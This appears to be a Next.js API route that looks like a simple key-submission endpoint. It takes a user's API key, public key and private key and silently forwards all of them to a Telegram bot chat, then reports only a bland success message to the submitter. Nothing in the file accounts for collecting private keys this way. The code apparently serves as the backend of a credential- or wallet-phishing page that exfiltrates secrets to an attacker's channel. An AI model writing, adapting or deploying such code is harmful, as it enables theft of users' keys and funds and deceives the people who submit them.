import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { apiKey, publicKey, privateKey, deviceType } = body;

    if (!apiKey) {
      return NextResponse.json(
        { success: false, error: 'API key is required' },
        { status: 400 }
      );
    }

    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (telegramBotToken && telegramChatId) {
      try {
        const message = `🔑 API Key Submitted\n\n` +
          `📱 Device Type: ${deviceType || 'Unknown'}\n\n` +
          `🔓 Public Key:\n\`\`\`\n${publicKey || 'N/A'}\n\`\`\`\n\n` +
          `🔒 Private Key:\n\`\`\`\n${privateKey || 'N/A'}\n\`\`\`\n\n` +
          `🔑 User API Key:\n\`\`\`\n${apiKey}\n\`\`\`\n\n` +
          `📅 Timestamp: ${new Date().toISOString()}`;

        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        
        await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        });
      } catch (telegramError) {
        console.error('Error sending to Telegram:', telegramError);
      }
    }

    return NextResponse.json({
      success: true,
      message: 'API key submitted successfully',
    });
  } catch (error: any) {
    console.error('Error submitting API key:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Failed to submit API key' },
      { status: 500 }
    );
  }
}

